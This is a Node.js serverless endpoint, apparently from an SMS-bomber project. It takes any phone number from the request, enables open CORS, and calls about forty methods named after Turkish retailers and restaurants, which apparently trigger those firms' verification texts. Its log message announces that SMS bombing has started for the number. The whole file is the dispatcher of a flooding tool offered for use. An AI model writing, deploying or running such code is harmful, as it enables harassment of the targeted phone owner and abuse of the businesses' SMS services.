const SendSms = require('../app.js');
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    const phone = req.query.phone || req.body?.phone;
    if (!phone || phone.length < 10) {
        return res.status(400).json({
            success: false,
            error: 'Geçerli bir telefon numarası girin (örn: 5551234567)'
        });
    }
    try {
        const smsSender = new SendSms(phone);
        let successCount = 0;
        const services = [
            smsSender.KahveDunyasi,
            smsSender.Wmf,
            smsSender.Bim,
            smsSender.Englishhome,
            smsSender.Suiste,
            smsSender.KimGb,
            smsSender.Evidea,
            smsSender.Ucdortbes,
            smsSender.TiklaGelsin,
            smsSender.Naosstars,
            smsSender.Koton,
            smsSender.Hayatsu,
            smsSender.Hizliecza,
            smsSender.Metro,
            smsSender.File,
            smsSender.Akasya,
            smsSender.Akbati,
            smsSender.Komagene,
            smsSender.Porty,
            smsSender.Tasdelen,
            smsSender.Uysal,
            smsSender.Yapp,
            smsSender.YilmazTicaret,
            smsSender.Beefull,
            smsSender.Dominos,
            smsSender.Baydoner,
            smsSender.Pidem,
            smsSender.Frink,
            smsSender.Bodrum,
            smsSender.KofteciYusuf,
            smsSender.Little,
            smsSender.Orwi,
            smsSender.Coffy,
            smsSender.Hamidiye,
            smsSender.Fatih,
            smsSender.Sancaktepe,
            smsSender.Bayrampasa,
            smsSender.Money,
            smsSender.Alixavien,
            smsSender.Jimmykey,
            smsSender.Ido
        ];
        console.log(`${phone} için SMS bombardımanı başlatıldı...`);
        for (const service of services) {
            try {
                await service.call(smsSender);
                successCount++;
            } catch (e) {
            }
        }
        res.status(200).json({
            success: true,
            phone: phone,
            total_attempted: services.length,
            successful: successCount,
            message: "SMS gönderme tamamlandı."
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            error: 'Bir hata oluştu'
        });
    }
};
